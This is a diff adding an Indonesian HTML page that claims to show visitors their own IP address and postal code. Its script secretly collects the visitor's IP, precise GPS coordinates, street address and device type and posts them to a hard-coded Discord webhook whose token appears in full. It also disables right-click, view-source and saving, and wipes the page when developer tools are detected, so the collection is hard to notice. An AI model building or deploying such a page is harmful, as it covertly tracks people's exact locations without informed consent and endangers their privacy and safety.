@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cek ip address & pos code</title>
+    <style>
+        /* Proteksi tambahan: Mencegah teks diseleksi/diblok */
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            margin-top: 30px; 
+            padding: 20px; 
+            background-color: #f4f4f9;
+            -webkit-user-select: none; 
+            -ms-user-select:     none; 
+            user-select:         none; 
+        }
+        .container {
+            max-width: 450px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        button { 
+            padding: 12px 20px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            background-color: #5865F2; 
+            color: white; 
+            border: none; 
+            border-radius: 5px; 
+            width: 100%;
+        }
+        button:hover { background-color: #4752C4; }
+        #status { 
+            margin-top: 20px; 
+            font-size: 14px; 
+            text-align: left;
+            word-break: break-all;
+        }
+        .map-link {
+            display: inline-block;
+            margin-top: 10px;
+            padding: 8px 12px;
+            background-color: #28a745;
+            color: white;
+            text-decoration: none;
+            border-radius: 4px;
+        }
+        .map-link:hover { background-color: #218838; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>Melihat ip address & pos kode anda</h2>
+        <p>Klik tombol di bawah untuk melihat alamat ip dan pos kode anda sendiri.
+          (✅tingkat keamanan aktif)</p>
+        
+        <button onclick="prosesData()">Mulai Verifikasi</button>
+        <div id="status"></div>
+    </div>
+
+    <!-- Script Lapisan Keamanan Tambahan -->
+    <script>
+        // 1. Mencegah Klik Kanan
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // 2. Mencegah Tombol Pintasan Keyboard (Inspect, View Source, Debugger)
+        document.addEventListener('keydown', function(e) {
+            // F12
+            if (e.key === 'F12') {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+Shift+I / J / C
+            if (e.ctrlKey && e.shiftKey && ['I', 'i', 'J', 'j', 'C', 'c'].includes(e.key)) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+U (View Source)
+            if (e.ctrlKey && ['U', 'u'].includes(e.key)) {
+                e.preventDefault();
+                return false;
+            }
+            // Ctrl+S (Save Page)
+            if (e.ctrlKey && ['S', 's'].includes(e.key)) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // 3. Proteksi Tambahan: Deteksi DevTools / Konsol Terbuka
+        setInterval(function() {
+            const threshold = 160;
+            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+                document.body.innerHTML = "<h2 style='text-align:center; color:red; margin-top:100px;'>⚠ Akses Dibatasi: Sistem mendeteksi perangkat debug atau Developer Tools.</h2>";
+            }
+        }, 1000);
+
+        // 4. Mencegah Debugger otomatis dengan teknik infinite debugger loop
+        (function() {
+            try {
+                function checkDevTools() {
+                    const startTime = new Date();
+                    debugger;
+                    const endTime = new Date();
+                    if (endTime - startTime > 100) {
+                        document.body.innerHTML = "<h2 style='text-align:center; color:red; margin-top:100px;'>⛔ Keamanan Terpanggil!</h2>";
+                    }
+                }
+                setInterval(checkDevTools, 2000);
+            } catch (err) {}
+        })();
+    </script>
+
+    <!-- Script Utama (IP, Geolocation, Device Info, & Discord Webhook) -->
+    <script>
+        // Ganti URL di bawah ini dengan Discord Webhook URL milik Anda
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1554889093832384583/nTdlUrC5GXijfj_TQRF-ybZ5ZbvLj-JCWqk5zvoM8B7M6FsuWhiHBzuy5ZmGffxSDWcw";
+
+        // Fungsi untuk mendeteksi informasi perangkat / merek HP secara sederhana
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Perangkat Tidak Dikenal";
+
+            if (/android/i.test(ua)) {
+                // Coba ekstrak tipe/merek HP jika ada di dalam string User Agent Android
+                let match = ua.match(/\(([^)]+)\)/);
+                if (match && match[1]) {
+                    let parts = match[1].split(';');
+                    // Biasanya bagian spesifik perangkat ada di indeks akhir atau setelah Build
+                    device = "Android (" + parts[parts.length - 1].trim() + ")";
+                } else {
+                    device = "Android Device";
+                }
+            } else if (/iphone|ipad|ipod/i.test(ua)) {
+                device = "iOS / Apple Device";
+            } else if (/windows/i.test(ua)) {
+                device = "Windows PC";
+            } else if (/macintosh|mac os x/i.test(ua)) {
+                device = "Mac Computer";
+            }
+            return device;
+        }
+
+        async function prosesData() {
+            const statusDiv = document.getElementById("status");
+            statusDiv.style.color = "black";
+            statusDiv.innerHTML = "⏳ Memproses verifikasi perangkat...";
+
+            let ipAddress = "Tidak diketahui";
+            let postalCode = "Tidak ditemukan";
+            let addressName = "Tidak diketahui";
+            let deviceInfo = getDeviceInfo();
+
+            // Ambil IP Address
+            try {
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                ipAddress = ipData.ip;
+            } catch (e) {}
+
+            if (!navigator.geolocation) {
+                statusDiv.style.color = "red";
+                statusDiv.innerHTML = `IP: <b>${ipAddress}</b><br>❌ Geolocation tidak didukung.`;
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+                    // Ambil Kode Pos & Alamat Lebih Detail
+                    try {
+                        const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+                            headers: { "User-Agent": "VerifikasiAplikasiWeb" }
+                        });
+                        const geoData = await geoResponse.json();
+                        
+                        if (geoData && geoData.address) {
+                            postalCode = geoData.address.postcode || "Tidak tersedia";
+                            
+                            // Merapikan deskripsi lokasi agar lebih jelas dibaca
+                            let road = geoData.address.road || geoData.address.suburb || "";
+                            let city = geoData.address.city || geoData.address.town || geoData.address.county || "";
+                            let state = geoData.address.state || "";
+                            let country = geoData.address.country || "";
+                            
+                            addressName = `${road ? road + ', ' : ''}${city ? city + ', ' : ''}${state ? state + ', ' : ''}${country}`;
+                        }
+                    } catch (e) {}
+
+                    // Tampilkan ke layar user
+                    statusDiv.innerHTML = `
+                        <p style="color: green;"><b>✅ Verifikasi Selesai!</b></p>
+                        <p><b>📱 Perangkat:</b> <code>${deviceInfo}</code></p>
+                        <p><b>🌐 IP Address:</b> <code>${ipAddress}</code></p>
+                        <p><b>📍 Latitude:</b> ${lat}</p>
+                        <p><b>📍 Longitude:</b> ${lon}</p>
+                        <p><b>📮 Kode Pos:</b> ${postalCode}</p>
+                        <p><b>🗺️ Lokasi Jelas:</b> ${addressName}</p>
+                        <p><b>🎯 Akurasi GPS:</b> ±${Math.round(accuracy)} meter</p>
+                        <a href="${mapsUrl}" target="_blank" class="map-link">Buka di Google Maps</a>
+                        <hr>
+                        <p id="discord-status"><i>Mengirim laporan ke sistem...</i></p>
+                    `;
+
+                    // Kirim ke Discord Webhook dengan deskripsi lengkap
+                    const payload = {
+                        content: `🚀 **Data Verifikasi Diterima!**\n` +
+                                 `- **Perangkat:** \`${deviceInfo}\`\n` +
+                                 `- **IP Address:** \`${ipAddress}\`\n` +
+                                 `- **Lat/Lon:** \`${lat},${lon}\`\n` +
+                                 `- **Kode Pos:** \`${postalCode}\`\n` +
+                                 `- **Lokasi Detail:** ${addressName}\n` +
+                                 `- **Google Maps:** ${mapsUrl}`
+                    };
+
+                    try {
+                        const discordResponse = await fetch(WEBHOOK_URL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(payload)
+                        });
+
+                        const discordStatus = document.getElementById("discord-status");
+                        if (discordResponse.ok) {
+                            discordStatus.style.color = "green";
+                            discordStatus.innerHTML = "✔ Cek Berhasil";
+                        } else {
+                            discordStatus.style.color = "red";
+                            discordStatus.innerHTML = "✖ Gagal Cek.";
+                        }
+                    } catch (error) {
+                        const discordStatus = document.getElementById("discord-status");
+                        discordStatus.style.color = "red";
+                        discordStatus.innerHTML = "✖ Gagal terhubung.";
+                    }
+                },
+                (error) => {
+                    statusDiv.style.color = "red";
+                    statusDiv.innerHTML = `IP: <b>${ipAddress}</b><br>❌ Izin lokasi ditolak/gagal.`;
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+    </script>
+
+</body>
+</html>
